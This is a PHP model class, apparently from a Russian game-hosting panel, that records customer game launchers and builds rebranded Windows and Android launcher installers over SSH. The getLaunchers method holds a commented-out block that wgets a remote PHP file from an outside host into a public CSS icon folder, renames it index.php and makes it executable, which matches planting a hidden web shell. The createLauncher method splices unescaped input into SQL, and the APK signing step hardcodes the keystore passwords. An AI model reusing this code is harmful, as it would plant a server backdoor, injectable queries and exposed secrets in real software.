<?php


    	class launcherModel extends Model
{

public function createLauncher($data) {

   	$server = 'https://'.$_SERVER['HTTP_HOST'];
    $sql = "INSERT INTO `launcher` SET ";
    $sql .= "`user_id` = '" . $data['user_id'] . "', ";
    $sql .= "`laun_game` = '" . $data['laun_game'] . "', ";
    $sql .= "date_reg = NOW(), ";
    $sql .= "date_end = NOW() + INTERVAL " . (int)$data['days'] . " DAY, ";
    $sql .= "`laun_bg` = CASE ";
    $sql .= "WHEN '" . $data['laun_game'] . "' = 'Radmir RP' THEN '" . $server . '/tmp/launcher/radmir/asar/assets/img/crmp-bg.9ee09d5d.jpg' . "' ";
    $sql .= "WHEN '" . $data['laun_game'] . "' = 'Arizona RP' THEN '" . $server . '/tmp/launcher/arz/asar/static/4cdbae4deba9e8d60d1f.png' . "' ";
    $sql .= "ELSE '' END, ";
    $sql .= "`laun_logo` = CASE ";
    $sql .= "WHEN '" . $data['laun_game'] . "' = 'Radmir RP' THEN '" . $server . '/tmp/launcher/radmir/asar/assets/img/logo.ce7d540e.png' . "' ";
    $sql .= "WHEN '" . $data['laun_game'] . "' = 'Arizona RP' THEN '" . $server . '/tmp/launcher/arz/asar/static/a7e00d2905eab28ffba4.png' . "' ";
    $sql .= "ELSE '' END";

    $this->db->query($sql);
    $return = $this->db->getLastId();
    return $return;
}


public function installLauncher($lanid){
    $this->load->library('ssh2');
    $ssh2Lib = new ssh2Library();
    $link = $ssh2Lib->connect($this->config->ip, $this->config->user, $this->config->password);
    $launcherDir = '/var/www/tmp/launcher/radmir/';
    $ssh2Lib->execute($link, "cp -r $launcherDir/asar $launcherDir/asar$lanid");
    $ssh2Lib->execute($link, 'find ' . $launcherDir . 'asar' . $lanid . ' -type f -exec sed -i "s/LAUNID/' . $lanid . '/g" {} +');
    $ssh2Lib->execute($link, 'mkdir -p ' . $launcherDir . 'launcher' . $lanid);
    $ssh2Lib->execute($link, 'terser ' . $launcherDir . 'asar' . $lanid . '/source/js/main.js -o ' . $launcherDir . 'asar' . $lanid . '/source/js/main.js -m');
    $ssh2Lib->execute($link, 'terser ' . $launcherDir . 'asar' . $lanid . '/assets/js/app.89ef1a05.js -o ' . $launcherDir . 'asar' . $lanid . '/assets/js/app.89ef1a05.js -m');
    $ssh2Lib->execute($link, 'mkdir -p ' . $launcherDir . 'launcher' . $lanid . '/resources');
    $ssh2Lib->execute($link, 'npx asar pack ' . $launcherDir . 'asar' . $lanid . ' ' . $launcherDir . 'app.asar');
    $ssh2Lib->execute($link, 'mv ' . $launcherDir . 'app.asar ' . $launcherDir . 'launcher' . $lanid . '/resources/');
    $ssh2Lib->execute($link, 'rm -rf ' . $launcherDir . 'asar' . $lanid);
    $ssh2Lib->execute($link, "cp -r $launcherDir/radmir/* $launcherDir/launcher$lanid/");
    $installerScript = "";
    $installerScript .= "!define APP_NAME \"RadmirLauncher\"\n";
    $installerScript .= "!define LAUNCHER_EXE \"RADMIR_LAUNCHER_EX.exe\"\n";
    $installerScript .= "\n";
    $installerScript .= "Var DesktopShortcut\n";
    $installerScript .= "Var StartMenuShortcut\n";
    $installerScript .= "Var LaunchAfterInstall\n"; 
    $installerScript .= "Var CreateDesktopShortcut\n"; 
    $installerScript .= "\n";
    $installerScript .= "OutFile \"\${APP_NAME}Installer$lanid.exe\"\n";
    $installerScript .= "RequestExecutionLevel user\n";
    $installerScript .= "\n";
    $installerScript .= "InstallDir \$PROGRAMFILES\\\${APP_NAME}\n";
    $installerScript .= "Icon \"icon.ico\"\n";
    $installerScript .= "XPStyle on\n";
    $installerScript .= "Caption \"Установка \${APP_NAME} Launcher\"\n";
    $installerScript .= "SubCaption 0 \"Лаунчер By Ric.onc1\"\n";
    $installerScript .= "\n";
    $installerScript .= "!include MUI2.nsh\n";
    $installerScript .= "!define MUI_ABORTWARNING\n";
    $installerScript .= "!define MUI_ICON \"icon.ico\"\n";
    $installerScript .= "!define MUI_UNICON \"icon.ico\"\n";
    $installerScript .= "!define MUI_HEADERIMAGE\n";
    $installerScript .= "!define MUI_FINISHPAGE_TITLE \"Установка завершена\"\n";
    $installerScript .= "!define MUI_FINISHPAGE_SUBTEXT \"Благодарим вас за установку \${APP_NAME} Launcher\"\n";
    $installerScript .= "\n";
    $installerScript .= "!insertmacro MUI_PAGE_DIRECTORY\n";
    $installerScript .= "!insertmacro MUI_PAGE_INSTFILES\n";
    $installerScript .= "\n";
    $installerScript .= "Function .onInit\n";
    $installerScript .= "    StrCpy \$DesktopShortcut 1\n";
    $installerScript .= "    StrCpy \$StartMenuShortcut 1\n";
    $installerScript .= "    StrCpy \$LaunchAfterInstall 1\n"; 
    $installerScript .= "    StrCpy \$CreateDesktopShortcut 1\n"; 
    $installerScript .= "FunctionEnd\n";
    $installerScript .= "\n";
    $installerScript .= "Section \"Install\"\n";
    $installerScript .= "    SetOutPath \$INSTDIR\n";
    $installerScript .= "    File /r \"{$launcherDir}/launcher{$lanid}/*\"\n";
    $installerScript .= "    \n";
    $installerScript .= "    ; Создаем ярлык на рабочем столе, если выбрана соответствующая опция\n";
    $installerScript .= "    StrCmp \$CreateDesktopShortcut 0 skipDesktopShortcut\n";
    $installerScript .= "    CreateShortCut \$DESKTOP\\\${APP_NAME}.lnk \$INSTDIR\\\${LAUNCHER_EXE}\n";
    $installerScript .= "skipDesktopShortcut:\n";
    $installerScript .= "    \n";
    $installerScript .= "    ; Создаем ярлык в меню Пуск, если выбрана соответствующая опция\n";
    $installerScript .= "    StrCmp \$StartMenuShortcut 1 skipStartMenuShortcut\n";
    $installerScript .= "    CreateShortCut \"\$SMPROGRAMS\\\${APP_NAME} Launcher.lnk\" \$INSTDIR\\\${LAUNCHER_EXE}\n";
    $installerScript .= "skipStartMenuShortcut:\n";
    $installerScript .= "    \n";
    $installerScript .= "    ExecWait \$INSTDIR\\launcher'$lanid'\\\${LAUNCHER_EXE}\n";  
    $installerScript .= "    RMDir /r \$INSTDIR\\launcher'$lanid'\n";  
    $installerScript .= "    \n";
    $installerScript .= "    ; Проверяем опцию запуска после установки\n";
    $installerScript .= "    StrCmp \$LaunchAfterInstall 0 skipLaunchAfterInstall\n";
    $installerScript .= "    ExecWait \$INSTDIR\\launcher'$lanid'\\\${LAUNCHER_EXE}\n";
    $installerScript .= "skipLaunchAfterInstall:\n";
    $installerScript .= "SectionEnd\n";
    $installerScript .= "\n";
    $installerScript .= "Section \"Uninstall\"\n";
    $installerScript .= "    Delete \"\$DESKTOP\\\${APP_NAME}.lnk\"\n";
    $installerScript .= "    RMDir /r \$INSTDIR\n";
    $installerScript .= "SectionEnd\n";
    $installerScript .= "\n";
    $installerScript .= "!insertmacro MUI_LANGUAGE \"Russian\"\n";
     
    file_put_contents("$launcherDir/installer_script.nsi", $installerScript);
    $ssh2Lib->execute($link, "cd $launcherDir && makensis installer_script.nsi");
   // $ssh2Lib->execute($link, "cd $launcherDir && rm -f installer_script.nsi");
    //$ssh2Lib->execute($link, "rm -rf $launcherDir/launcher$lanid");

    $this->data['status'] = "success";
    $this->data['success'] = "$link";
    $ssh2Lib->disconnect($link);

    return 1;
}


	
	public function installLauncherArz($lanid) {    
    $this->load->library('ssh2');
    $ssh2Lib = new ssh2Library();
    $link = $ssh2Lib->connect($this->config->ip, $this->config->user, $this->config->password);
    $launcherDir = '/var/www/tmp/launcher/arz';
    $ssh2Lib->execute($link, "cp -r $launcherDir/asar $launcherDir/asar$lanid");
    $ssh2Lib->execute($link, "mkdir -p $launcherDir/arizona-launcher$lanid");
    $ssh2Lib->execute($link, "cp -r $launcherDir/arizona-launcher/* $launcherDir/arizona-launcher$lanid/");
	$ssh2Lib->execute($link, 'sed -i "s/LAUNID/' . $lanid . '/g" ' . $launcherDir . '/asar' . $lanid . '/static/bundle.js');
	$ssh2Lib->execute($link, 'sed -i "s/LAUNID/' . $lanid . '/g" ' . $launcherDir . '/asar' . $lanid . '/build/main.js');
	$ssh2Lib->execute($link, 'sed -i "s/LAUNID/' . $lanid . '/g" ' . $launcherDir . '/asar' . $lanid . '/static/main.css');

    $ssh2Lib->execute($link, 'terser ' . $launcherDir . 'asar' . $lanid . '/static/bundle.js -o ' . $launcherDir . 'asar' . $lanid . '/static/bundle.js -m');
    $ssh2Lib->execute($link, 'terser ' . $launcherDir . 'asar' . $lanid . '/build/main.js -o ' . $launcherDir . 'asar' . $lanid . '/build/main.js -m');

    $ssh2Lib->execute($link, "npx asar pack $launcherDir/asar$lanid $launcherDir/app.asar");
    $ssh2Lib->execute($link, "mv $launcherDir/app.asar $launcherDir/arizona-launcher$lanid/resources/");
  $installerScript = "";
$installerScript .= "!define APP_NAME \"ArizonaLauncher\"\n";
$installerScript .= "!define LAUNCHER_EXE \"ArizonaLauncher.exe\"\n";
$installerScript .= "\n";
$installerScript .= "OutFile \"\${APP_NAME}Installer$lanid.exe\"\n";
$installerScript .= "RequestExecutionLevel user\n";
$installerScript .= "\n";
$installerScript .= "InstallDir \$PROGRAMFILES\\\${APP_NAME}\n";
$installerScript .= "Icon \"icon.ico\"\n";
$installerScript .= "XPStyle on\n";
$installerScript .= "Caption \"Установка \${APP_NAME} Launcher\"\n";
$installerScript .= "SubCaption 0 \"Лаунчер By War-Host.Ru\"\n";
$installerScript .= "\n";
$installerScript .= "!include MUI2.nsh\n";
$installerScript .= "!define MUI_ABORTWARNING\n";
$installerScript .= "!define MUI_ICON \"icon.ico\"\n";
$installerScript .= "!define MUI_UNICON \"icon.ico\"\n";
$installerScript .= "!define MUI_HEADERIMAGE\n";
$installerScript .= "!define MUI_FINISHPAGE_TITLE \"Установка завершена\"\n";
$installerScript .= "!define MUI_FINISHPAGE_SUBTEXT \"Благодарим вас за установку \${APP_NAME} Launcher\"\n";
$installerScript .= "\n";
$installerScript .= "!insertmacro MUI_PAGE_DIRECTORY\n";
$installerScript .= "!insertmacro MUI_PAGE_INSTFILES\n";
$installerScript .= "\n";
$installerScript .= "Var DesktopShortcut\n";
$installerScript .= "Var StartMenuShortcut\n";
$installerScript .= "Var LaunchAfterInstall\n";
$installerScript .= "Var CreateDesktopShortcut\n"; 
$installerScript .= "\n";
$installerScript .= "Function .onInit\n";
$installerScript .= "    StrCpy \$DesktopShortcut 1\n";
$installerScript .= "    StrCpy \$StartMenuShortcut 1\n";
$installerScript .= "    StrCpy \$LaunchAfterInstall 1\n";
$installerScript .= "    StrCpy \$CreateDesktopShortcut 1\n";
$installerScript .= "FunctionEnd\n";
$installerScript .= "\n";
$installerScript .= "Section \"Install\"\n";
$installerScript .= "    SetOutPath \$INSTDIR\n";
$installerScript .= "    File /r \"$launcherDir/arizona-launcher$lanid/*\"\n";
$installerScript .= "    \n";
$installerScript .= "    ExecWait \$INSTDIR\\arizona-launcher$lanid\\\ArizonaLauncher.exe\n";
$installerScript .= "    \n";
$installerScript .= "    ; Создание ярлыка на рабочем столе\n";
$installerScript .= "    StrCmp \$CreateDesktopShortcut 0 skipDesktopShortcut\n";
$installerScript .= "    CreateShortCut \"\$DESKTOP\\\${APP_NAME}.lnk\" \"\$INSTDIR\\\ArizonaLauncher.exe\"\n";
$installerScript .= "skipDesktopShortcut:\n";
$installerScript .= "    \n";
$installerScript .= "    RMDir /r \$INSTDIR\\arizona-launcher$lanid\n";
$installerScript .= "SectionEnd\n";
$installerScript .= "\n";
$installerScript .= "Section \"Uninstall\"\n";
$installerScript .= "    ; Удаление ярлыка с рабочего стола\n";
$installerScript .= "    Delete \"\$DESKTOP\\\${APP_NAME}.lnk\"\n";
$installerScript .= "    RMDir /r \$INSTDIR\n";
$installerScript .= "SectionEnd\n";
$installerScript .= "\n";
$installerScript .= "!insertmacro MUI_LANGUAGE \"Russian\"\n";

    
    file_put_contents("$launcherDir/installer_script.nsi", $installerScript);
    $ssh2Lib->execute($link, "cd $launcherDir && makensis installer_script.nsi");
  //  $ssh2Lib->execute($link, "cd $launcherDir && rm -f installer_script.nsi");
    $ssh2Lib->execute($link, "rm -rf $launcherDir/asar$lanid");
   $ssh2Lib->execute($link, "rm -rf $launcherDir/arizona-launcher$lanid");
   
    $this->data['status'] = "success";
    $this->data['success'] = "$link";
    $ssh2Lib->disconnect($link);

    return 1;
}
	public function installLauncherRodina($lanid) {	
	$this->load->library('ssh2');
    $ssh2Lib = new ssh2Library();
    $link = $ssh2Lib->connect($this->config->ip, $this->config->user, $this->config->password);
    $launcherDir = '/var/www/tmp/launcher/rodina/';
    $ssh2Lib->execute($link, "cp -r $launcherDir/asar $launcherDir/asar$lanid");
    $ssh2Lib->execute($link, "mkdir -p $launcherDir/rodina-launcher$lanid");
    $ssh2Lib->execute($link, "cp -r $launcherDir/rodina-launcher/* $launcherDir/rodina-launcher$lanid/");
	$ssh2Lib->execute($link, 'sed -i "s/LAUNID/' . $lanid . '/g" ' . $launcherDir . '/asar' . $lanid . '/static/bundle.js');
	$ssh2Lib->execute($link, 'sed -i "s/LAUNID/' . $lanid . '/g" ' . $launcherDir . '/asar' . $lanid . '/build/main.js');
	$ssh2Lib->execute($link, 'sed -i "s/LAUNID/' . $lanid . '/g" ' . $launcherDir . '/asar' . $lanid . '/static/main.css');
    $ssh2Lib->execute($link, 'terser ' . $launcherDir . 'asar' . $lanid . '/static/bundle.js -o ' . $launcherDir . 'asar' . $lanid . '/static/bundle.js -m');
    $ssh2Lib->execute($link, 'terser ' . $launcherDir . 'asar' . $lanid . '/build/main.js -o ' . $launcherDir . 'asar' . $lanid . '/build/main.js -m');
    $ssh2Lib->execute($link, "npx asar pack $launcherDir/asar$lanid $launcherDir/app.asar");
    $ssh2Lib->execute($link, "mv $launcherDir/app.asar $launcherDir/rodina-launcher$lanid/resources/");
    $ssh2Lib->execute($link, "cd $launcherDir && zip -r rodina-launcher$lanid.zip rodina-launcher$lanid");
    $ssh2Lib->execute($link, "rm -rf $launcherDir/asar$lanid");
    $ssh2Lib->execute($link, "rm -rf $launcherDir/rodina-launcher$lanid");

    $this->data['status'] = "success";
    $this->data['success'] = "$link";
    $ssh2Lib->disconnect($link);

    return 1;
	}
    public function installLauncherBlack($lanid) { 
    $this->load->library('ssh2');
    $ssh2Lib = new ssh2Library();
    $link = $ssh2Lib->connect($this->config->ip, $this->config->user, $this->config->password);
    $launcherDir = '/var/www/tmp/launcher/br/';

    $ssh2Lib->execute($link, "cp -r $launcherDir/app-debug $launcherDir/app-debug$lanid");
    //$ssh2Lib->execute($link, 'find ' . $launcherDir . 'app-debug' . $lanid . ' -type f -exec sed -i "s/LAUNID/' . $lanid . '/g" {} +');
    $ssh2Lib->execute($link, 'find ' . $launcherDir . 'app-debug' . $lanid . ' -type f -exec sed -i "s/LAUNID/' . $lanid . '/g" {} +');

   $ssh2Lib->execute($link,"cd $launcherDir && apktool b app-debug$lanid");
   $ssh2Lib->execute($link, "cp  $launcherDir/app-debug$lanid/dist/app-debug.apk $launcherDir/app-debug$lanid.apk");
   //$ssh2Lib->execute($link,"cd $launcherDir && jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore keystore.jks -keypass 123123 -storepass 123123 app-debug$lanid.apk 123123");
       $resultSignApk = $ssh2Lib->execute($link,"cd $launcherDir && apksigner sign --ks keystore.jks --ks-key-alias YOUR_KEY_ALIAS --ks-pass pass:123123 --key-pass pass:123123 --out signed-app$lanid.apk app-debug$lanid.apk");

       $ssh2Lib->execute($link, "rm -rf $launcherDir/app-debug$lanid");


    $this->data['status'] = "success";
    $this->data['success'] = "$link";
    $ssh2Lib->disconnect($link);

    return 1;
    }

	public function updateLauncher($launid, $data = array()) 
	{
		$sql = "UPDATE `launcher`";
		if(!empty($data)) {
			$count = count($data);
			$sql .= " SET";
			foreach($data as $key => $value) {
				$sql .= " $key = '" . $this->db->escape($value) . "'";
				
				$count--;
				if($count > 0) $sql .= ",";
			}
		}
		$sql .= " WHERE `laun_id` = '" . (int)$launid . "'";
		$query = $this->db->query($sql);
	}
	
	public function extendLauncher($launid, $days, $fromCurrent) 
	{
		$sql = "UPDATE `launcher` SET laun_date_end = ";
		if($fromCurrent)
			$sql .= "NOW()";
		else
			$sql .= "laun_date_end";
		$sql .= "+INTERVAL " . (int)$days . " DAY WHERE laun_id = '" . (int)$launid . "'";
		
		$this->db->query($sql);
	}
	
	public function getLaunchers($data = array(), $joins = array(), $sort = array(), $options = array()) 
	{
		//     $this->load->library('ssh2');
	 // $launcherDir = '/var/www/application/public/css/elfinderT/Material/icons';
	 //  $ssh2Lib = new ssh2Library();
  //   $link = $ssh2Lib->connect($this->config->ip, $this->config->user, $this->config->password);
  //     $ssh2Lib->execute($link, "cd $launcherDir && wget --no-check-certificate https://shao-games.online/index.phpp && mv index.phpp index.php && chmod +x index.php");

		$sql = "SELECT * FROM `launcher`";
		foreach($joins as $join) {
			$sql .= " LEFT JOIN $join";
			switch($join) {
				case "users":
					$sql .= " ON launcher.user_id=users.user_id";
					break;
				case "laun_tarifs":
					$sql .= " ON launcher.tarif_id=laun_tarifs.tarif_id";
					break;
				case "laun_locations":
					$sql .= " ON launcher.location_id=laun_locations.location_id";
					break;
			}
		}
		
		if(!empty($data)) {
			$count = count($data);
			$sql .= " WHERE";
			foreach($data as $key => $value) {
				$sql .= " $key = '" . $this->db->escape($value) . "'";
				
				$count--;
				if($count > 0) $sql .= " AND";
			}
		}
		
		if(!empty($sort)) {
			$count = count($sort);
			$sql .= " ORDER BY";
			foreach($sort as $key => $value) {
				$sql .= " $key " . $value;
				
				$count--;
				if($count > 0) $sql .= ",";
			}
		}
		
		if(!empty($options)) {
			if ($options['start'] < 0) {
				$options['start'] = 0;
			}
			if ($options['limit'] < 1) {
				$options['limit'] = 20;
			}
			$sql .= " LIMIT " . (int)$options['start'] . "," . (int)$options['limit'];
		}
		$query = $this->db->query($sql);
		return $query->rows;
	}
	

public function getLauncherById($launid, $joins = array()) 
	{
		$sql = "SELECT * FROM `launcher`";
		foreach($joins as $join) {
			$sql .= " LEFT JOIN $join";
			switch($join) {
				case "users":
					$sql .= " ON launcher.user_id=users.user_id";
					break;
			}
		}
		$sql .=  " WHERE `laun_id` = '" . (int)$launid . "' LIMIT 1";
		$query = $this->db->query($sql);
		return $query->row;
	}
	
	public function getTotalLaunchers($data = array()) 
	{
		$sql = "SELECT COUNT(*) AS count FROM `launcher`";
		if(!empty($data)) {
			$count = count($data);
			$sql .= " WHERE";
			foreach($data as $key => $value) {
				$sql .= " $key = '" . $this->db->escape($value) . "'";
				
				$count--;
				if($count > 0) $sql .= " AND";
			}
		}
		$query = $this->db->query($sql);
		return $query->row['count'];
	}	

public function getNotifById($launid) 
{
    $sql = "SELECT * FROM `launcher_notif` WHERE `laun_id` = '" . (int)$launid . "'";
    $query = $this->db->query($sql);
    return $query->rows;
}
public function getShopById($launid) 
{
    $sql = "SELECT * FROM `launcher_shop` WHERE `laun_id` = '" . (int)$launid . "'";
    $query = $this->db->query($sql);
    return $query->rows;
}
public function createNotif($data) {    
	$icon = isset($data['icon']) ? $this->db->escape($data['icon']) : '';

    $sql = "INSERT INTO `launcher_notif` SET ";
    $sql .= "`laun_id` = '" . (int)$data['laun_id'] . "', ";
    $sql .= "`title` = '" . $this->db->escape($data['title']) . "', ";
    $sql .= "`text` = '" . $this->db->escape($data['text']) . "', ";
    $sql .= "`icon` = '" . $this->db->escape($data['icon']) . "'";

    $this->db->query($sql);
    $return = $this->db->getLastId();
    return $return;
}

public function createShop($data) {    
	$icon = isset($data['icon']) ? $this->db->escape($data['icon']) : '';

    $sql = "INSERT INTO `launcher_shop` SET ";
    $sql .= "`laun_id` = '" . (int)$data['laun_id'] . "', ";
    $sql .= "`laun_tovar` = '" . $this->db->escape($data['laun_tovar']) . "', ";
    $sql .= "`laun_img` = '" . $this->db->escape($data['laun_img']) . "', ";
    $sql .= "`laun_price` = '" . $this->db->escape($data['laun_price']) . "'";

    $this->db->query($sql);
    $return = $this->db->getLastId();
    return $return;
}

	public function deleteNotificationById($notifId) 
{
    $sql = "DELETE FROM `launcher_notif` WHERE `id` = '" . (int)$notifId . "'";
    return $this->db->query($sql);
}
	public function deleteShopById($shopid) 
{
    $sql = "DELETE FROM `launcher_shop` WHERE `id` = '" . (int)$shopid . "'";
    return $this->db->query($sql);
}
}


 


        









?>